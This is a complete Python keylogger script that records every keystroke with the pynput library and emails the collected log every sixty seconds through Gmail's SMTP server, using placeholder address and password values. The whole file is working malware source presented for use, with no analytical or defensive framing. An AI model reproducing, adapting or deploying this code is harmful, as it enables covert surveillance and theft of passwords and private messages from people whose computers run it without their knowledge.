import pynput.keyboard
import threading
import smtplib

interval = 60 # after 60second you will receive email. change according to your need.
email = "youremail@email.com"
password = "password"
log = "KeyLogger Started"

def append_to_log(str):
    global log
    log+=str

def process_key_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key=" "
        else:
            current_key=" " + str(key) + " "
    append_to_log(current_key)

def report(): 
    global log
    send_mail(email,password, "\n\n" + log)
    log = ""
    timer = threading.Timer(interval, report)
    timer.start()
    
def send_mail(email,password,message):
    mail = smtplib.SMTP('smtp.gmail.com',587)
    mail.ehlo()
    mail.starttls()
    mail.login(email,password)
    recipients = email
    mail.sendmail(email,recipients,message)
    mail.close()
    
with pynput.keyboard.Listener(on_press=process_key_press) as keyboard_listener:
    report()
    keyboard_listener.join()